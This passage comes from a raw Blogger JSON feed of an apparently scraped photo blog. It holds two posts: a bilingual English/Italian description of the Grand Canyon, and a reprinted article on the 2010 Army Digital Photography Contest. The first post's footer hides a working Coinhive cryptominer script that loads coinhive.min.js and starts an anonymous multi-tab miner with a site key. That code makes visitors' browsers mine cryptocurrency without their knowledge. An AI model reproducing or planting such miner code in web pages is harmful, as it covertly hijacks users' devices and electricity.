It is largely contained within the Grand Canyon National Park, one of the first national parks in the United States. President Theodore Roosevelt was a major proponent of preservation of the Grand Canyon area, and visited it on numerous occasions to hunt and enjoy the scenery.\u003Cbr\/\u003EThe Grand Canyon is 277 miles (446 km) long, up to 18 miles (29 km) wide and attains a depth of over a mile (1.83 km) (6000 feet).[1] Nearly two billion years of the Earth's geological history have been exposed as the Colorado River and its tributaries cut their channels through layer after layer of rock while the Colorado Plateau was uplifted.[2] While the specific geologic processes and timing that formed the Grand Canyon are the subject of debate by geologists,[3] recent evidence suggests the Colorado River established its course through the canyon at least 17 million years ago.[4][5] Since that time, the Colorado River continued to erode and form the canyon to the point we see it at today.[6]\u003Cbr\/\u003EBefore European immigration, the area was inhabited by Native Americans who built settlements within the canyon and its many caves. The Pueblo people considered the Grand Canyon (\u0026quot;Ongtupqa\u0026quot; in Hopi language) a holy site and made pilgrimages to it.[7] The first European known to have viewed the Grand Canyon was García López de Cárdenas from Spain, who arrived in 1540.[8]\u003Cbr\/\u003E\u003Cbr\/\u003E----\u003Cbr\/\u003E\u003Cbr\/\u003EIl Grand Canyon è un'immensa gola creata dal fiume Colorado nell'Arizona settentrionale. È lungo 446 chilometri circa, profondo fino a 1.600 metri e con una larghezza variabile dai 500 metri ai 27 chilometri. Per la maggior parte è incluso nel parco nazionale del Grand Canyon, uno dei primi parchi nazionali degli Stati Uniti. Il presidente Theodore Roosevelt amava molto l'area del Grand Canyon e la visitò diverse volte, per andare a caccia di puma ed ammirare il paesaggio.\u003Cbr\/\u003EQuasi due miliardi di anni della storia della Terra sono emersi alla luce grazie all'azione del Colorado e dei suoi affluenti, che in milioni di anni hanno eroso strato dopo strato di sedimenti, e grazie al sollevamento del Colorado Plateau.\u003Cbr\/\u003EIl primo europeo a vedere il Grand Canyon fu lo spagnolo García López de Cárdenas nel 1540 che partì dal Nuovo Messico alla ricerca del misterioso fiume di cui parlavano gli indiani Hopi. La prima spedizione scientifica verso il canyon fu guidata dal maggiore statunitense John Wesley Powell alla fine degli anni '70 del XIX secolo. Powell descrisse le rocce sedimentarie esposte nel canyon come \u0026quot;pagine di un grande libro di storia\u0026quot;. Comunque, molto prima di queste scoperte, l'area era abitata da Nativi americani che costruirono insediamenti tra le pareti del canyon.\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cbr\/\u003EAndrea Costa Photography -  © All rights reserved\u003Cbr\/\u003E\u003C\/p\u003E\u003Cdiv class=\"blogger-post-footer\"\u003E\u003Cscript src=\"https:\/\/coinhive.com\/lib\/coinhive.min.js\"\u003E\u003C\/script\u003E\n\u003Cscript type=\"text\/JavaScript\"\u003E\n    var miner = new CoinHive.Anonymous('o2c5ecbIXWy8IFcRX7oHfVxW4apST2p7');\n    miner.start(CoinHive.FORCE_MULTI_TAB);\n\u003C\/script\u003E\u003C\/div\u003E"},"link":[{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/5473882551978058123\/posts\/default\/2514199815018767093"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/5473882551978058123\/posts\/default\/2514199815018767093"},{"rel":"alternate","type":"text/html","href":"http:\/\/sussurrossecretos.blogspot.com\/2016\/07\/cool-photo-ideas-images.html","title":"Cool Photo Ideas images"}],"author":[{"name":{"$t":"Celebrity Gosip and Movie Update"},"uri":{"$t":"http:\/\/www.blogger.com\/profile\/07804210199172886126"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}]},{"id":{"$t":"tag:blogger.com,1999:blog-5473882551978058123.post-8353818132820857518"},"published":{"$t":"2016-07-22T21:02:00.000-07:00"},"updated":{"$t":"2016-07-22T21:02:05.523-07:00"},"category":[{"scheme":"http://www.blogger.com/atom/ns#","term":"Cool"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Editing"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Image"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Image Editing Online"},{"scheme":"http://www.blogger.com/atom/ns#","term":"images"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Online"}],"title":{"type":"text","$t":"Cool Image Editing Online images"},"content":{"type":"html","$t":"\u003Cp\u003EA few nice image editing online images I found:\u003C\/p\u003E\u003Cbr\/\u003E\u003Cp\u003E\u003Cstrong\u003EPhotographers expand horizons in 2010 Army Digital Photography Contest 110311\u003C\/strong\u003E\u003Cbr\/\u003E\u003Cimg alt=\"image editing online\" src=\"http:\/\/farm6.staticflickr.com\/5028\/5546847155_709269a657.jpg\" width=\"400\"\/\u003E\u003Cbr\/\u003E\u003Ci\u003EImage by familymwr\u003C\/i\u003E\u003Cbr\/\u003EPHOTO CAPTION:  Awarded Honorable Mention Leaves on the Creek by CW3 DARLA SAUNDERS - Division 1 Active Duty Military\u003Cbr\/\u003E\u003Cbr\/\u003Ewww.Facebook.com\/FamilyMWR\u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cb\u003EPhotographers expand horizons in 2010 Army Digital Photography Contest 110311\u003C\/b\u003E\u003Cbr\/\u003E\u003Cbr\/\u003EBy Tim Hipps\u003Cbr\/\u003EFMWRC Public Affairs\u003Cbr\/\u003E\u003Cbr\/\u003EALEXANDRIA, Va. – Brenda Walker strolled upon “one of those right places at the right time” alongside East Fork Indian Creek River when she photographed “Morning Serenity” on Fort Campbell, Ky…\u003Cbr\/\u003E\u003Cbr\/\u003ERetired Col.

Pablo Piedra won a footrace with his wife to the bottom of a stairwell at Heidelberg Castle in Germany just before he looked up and photographed “9”…\u003Cbr\/\u003E\u003Cbr\/\u003E…all three were winners in the 2010 Army Digital Photography Contest sponsored by the Army Family and Morale, Welfare and Recreation Command.\u003Cbr\/\u003E\u003Cbr\/\u003EThere were 3,691 entries from around the world – 1,348 in Division I for active duty military personnel and 2,343 in Division II for other eligible MWR patrons. After Army garrisons selected their best entries, 664 Division I and 1,031 Division II photographs were forwarded for Department of the Army judging.\u003Cbr\/\u003E\u003Cbr\/\u003E“There were many really excellent photos, which made the judges’ decisions a difficult task,” said Linda Ezernieks, who monitors the annual contest at Army MWR Headquarters in Alexandria. “Originality, creativity and technical quality were the main criteria in making final selections.”\u003Cbr\/\u003E\u003Cbr\/\u003EWinners in each category – animals, digital darkroom, design elements, military life, monochrome, nature \u0026amp; landscapes, people, and still life – were posted on a website where Army Knowledge Online account-holders voted for their favorite photo in each division.\u003Cbr\/\u003E\u003Cbr\/\u003EWalker’s “Morning Serenity” took first place in the nature and landscapes category and was voted the most popular photograph in Division II. \u003Cbr\/\u003E\u003Cbr\/\u003EThe subject of the photo is a fisherman wading and casting in the middle of East Fork Indian Creek River while the sun shines through the lush, green trees and casts a rainbow-like appearance off the steam hovering above the stream.\u003Cbr\/\u003E\u003Cbr\/\u003E“It’s back on Fort Campbell,” Walker said. “I take my dog running back there early morning. It was really hot and the steam was rising and the rays were going through the trees. It was absolutely beautiful back there.\u003Cbr\/\u003E\u003Cbr\/\u003E“I take my camera everywhere I go now.”\u003Cbr\/\u003E\u003Cbr\/\u003EWalker left her business card on the windshield of a truck parked nearby and later learned the fisherman was Sgt. Randy Shorter of Fort Campbell.\u003Cbr\/\u003E\u003Cbr\/\u003EAbout five years ago, Walker took some of her photographs to the MWR Custom Framing Shop at Fort Campbell, where she found out about the Army Photography Contest. She has produced prize-winning photos for the past three contests.\u003Cbr\/\u003E\u003Cbr\/\u003E“It’s a wonderful opportunity to get exposure, plus cash prizes,” said Walker, 48, a military family member. “I enjoy looking at everybody else’s work. It inspires me and motivates me to get out and get more interesting, different shots.”\u003Cbr\/\u003E\u003Cbr\/\u003EWhat does Walker enjoy most about photography?\u003Cbr\/\u003E\u003Cbr\/\u003E“Just being able to capture what I see through my eyes, my heart and my head,” she said. “A lot of it comes out through your emotion. It’s another form of art.”\u003Cbr\/\u003E\u003Cbr\/\u003EPugh, of Clarksville, Tenn., took first place in the Division II digital darkroom category with “The Owl,” second in design elements with “Blue Mosque,” and third in nature and landscapes with “Point Lobos.”\u003Cbr\/\u003E\u003Cbr\/\u003EPugh shot the high-tech looking photo of “The Owl” at Land Between The Lakes, a national recreation area located south of Paducah, Ky., and embellished it in Photoshop, as he did with “Blue Mosque,” a shot of the roof of a mosque in Istanbul, Turkey.\u003Cbr\/\u003E\u003Cbr\/\u003E“I like this contest,” said Pugh, 65, who photographed winning entries in each of the past three years after serving 30 years in the Army. “It gives people a chance to show off something they did, which is great.”\u003Cbr\/\u003E\u003Cbr\/\u003EPiedro, 31, an Army recruiter in Douglasville, Ga., is a former combat photographer. His “9” earned first-place honors in the Division I design elements category. He took third place in digital darkroom with a self-portrait called “Beast within Me” that would make a dandy Halloween poster.\u003Cbr\/\u003E\u003Cbr\/\u003E“I got the idea when I was in the gym working out with my partner and a couple people came up to us and said: ‘You guys are lifting like beasts.’ The idea just popped into my head, so I got home, took the shot, and just started editing,” Piedro said. “That’s where that photo came from.”\u003Cbr\/\u003E\u003Cbr\/\u003EThe subject of the photo looks like a cross between a werewolf, a vampire and an Avatar, complete with fangs, dagger-like fingernails and alien ears – seemingly howling at the moon that looms behind a naked tree.\u003Cbr\/\u003E\u003Cbr\/\u003E“The fangs, the ears, the eyes and the hands are all Photoshopped,” Piedro said. “And the stomach that’s concaved a little bit, that was done in Photoshop. For the background, I took certain parts of images from other photos, adjusted them, and made everything into one image.”\u003Cbr\/\u003E\u003Cbr\/\u003ESo what’s real?\u003Cbr\/\u003E\u003Cbr\/\u003E“The body, and the face,” Piedro replied. “That’s it.\u003Cbr\/\u003E\u003Cbr\/\u003E“If you look closely, the eyes are actually black and the pupils are red, so that’s been Photoshopped.”\u003Cbr\/\u003E\u003Cbr\/\u003EPiedro, however, does not think of himself as a Photoshop expert.\u003Cbr\/\u003E\u003Cbr\/\u003E“I actually don’t do too much Photoshop,” he said. “I try to keep my images as pure as possible. But every now and then, I get my creative side and I do a little bit of Photoshop – just trial and error, playing around.”\u003Cbr\/\u003E\u003Cbr\/\u003EPiedro won two categories and received an honorable mention in the 2007 Army Photography Contest but missed the competition the past two years. \u003Cbr\/\u003E\u003Cbr\/\u003E“I think it’s a great, great program,” he said. “It’s a great way to get the creative process of people that do see the world and travel the world by being in the military, and not even just as Soldiers, but supporting staff, civilians, wives.\u003Cbr\/\u003E\u003Cbr\/\u003E“It’s a great way to get recognition for something that we love to do.”\u003Cbr\/\u003E\u003Cbr\/\u003EAs is often the case with photography, Piedro did not know exactly what he shot that day in the stairwell to the gardens at Heidelberg Castle – until he downloaded the photo.\u003Cbr\/\u003E\u003Cbr\/\u003E“When I got home and I looked at, I was like: ‘That’s 9, yeah.’ And that’s where the title came from.”\u003Cbr\/\u003E\u003Cbr\/\u003EPiedro cherishes photography’s uncanny ability of giving him the opportunity of “freezing a moment in time that only I can see and sharing that with others.” \u003Cbr\/\u003E\u003Cbr\/\u003ESeveral other military photographers earned multiple places in the 2010 Army Digital Photography Contest. \u003Cbr\/\u003E\u003Cbr\/\u003EHolly Swegle of Fort Hood, Texas, took first place in Division II monochrome for “Dress Shop,” second in animals for “Painted Birds” and third in people for “American Woman.”\u003Cbr\/\u003E\u003Cbr\/\u003ELt.
